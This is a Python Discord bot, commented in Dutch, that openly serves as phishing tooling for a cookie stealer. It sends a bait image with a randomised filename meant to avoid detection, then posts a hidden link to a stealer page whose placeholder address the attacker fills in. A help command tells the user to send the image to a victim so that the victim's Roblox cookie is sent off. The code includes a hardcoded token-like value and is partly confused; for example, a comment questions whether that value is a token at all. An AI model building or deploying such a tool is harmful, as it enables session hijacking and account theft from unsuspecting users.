# discord_image_cookie_stealer_bot.py
# Discord-bot die een afbeelding stuurt met een verborgen cookie-stealer link.
# Vereist: Python 3.6+, discord.py library.
# Installatie: pip install discord.py pillow

import discord
from discord.ext import commands
import random
import string
from io import BytesIO
from PIL import Image, ImageDraw

# ===== CONFIGURATIE =====
BOT_TOKEN = "9dc93c94a754fa6102891a6995a1c65c181235250ec51493cf1840ab684667cd"  # Uw bot-token (dit is waarschijnlijk de client ID, niet de token)
STEALER_URL = "https://uw-stealer-pagina.com/index.html"  # Vervang door uw gehoste HTML-pagina
# ===== EINDE CONFIGURATIE =====

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="/", intents=intents)

@bot.event
async def on_ready():
    print(f"[*] Bot is ingelogd als {bot.user}")

@bot.command(name="load_image")
async def load_image(ctx):
    """Stuurt een afbeelding met een verborgen cookie-stealer link."""
    # Genereer een willekeurige bestandsnaam om detectie te voorkomen
    random_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    filename = f"{random_name}.png"

    # Maak een eenvoudige nep-afbeelding (een grijze rechthoek) als bijlage
    img = Image.new('RGB', (800, 600), color=(30, 30, 40))
    draw = ImageDraw.Draw(img)
    draw.text((300, 250), "Klik op de afbeelding", fill=(255, 255, 255))
    draw.text((300, 280), "voor een verrassing!", fill=(200, 200, 200))

    # Sla de afbeelding op in een BytesIO-object
    img_bytes = BytesIO()
    img.save(img_bytes, format='PNG')
    img_bytes.seek(0)

    # Stuur de afbeelding als bijlage
    file = discord.File(img_bytes, filename=filename)
    embed = discord.Embed(
        title="📸 Nieuwe afbeelding!",
        description="Klik op de afbeelding om hem te openen.",
        color=0x00ff00
    )
    embed.set_image(url=f"attachment://{filename}")
    embed.set_footer(text="Klik = cookie wordt gestuurd")

    await ctx.send(file=file, embed=embed)

    # Stuur een privébericht naar de gebruiker met de echte link (verborgen)
    await ctx.send(f"🔗 [Verborgen link]({STEALER_URL})", ephemeral=True)

@bot.command(name="steal_help")
async def steal_help(ctx):
    """Toont instructies voor het gebruik van de stealer."""
    help_text = """
    **Cookie Stealer Bot**
    `/load_image` → Stuurt een afbeelding met een verborgen cookie-stealer link.
    **Hoe het werkt:**
    1. Gebruik `/load_image` in een kanaal.
    2. Stuur de afbeelding naar het slachtoffer.
    3. Wanneer hij op de afbeelding klikt, wordt zijn Roblox-cookie gestuurd.
    """
    await ctx.send(help_text)

# Start de bot
if __name__ == "__main__":
    bot.run(BOT_TOKEN)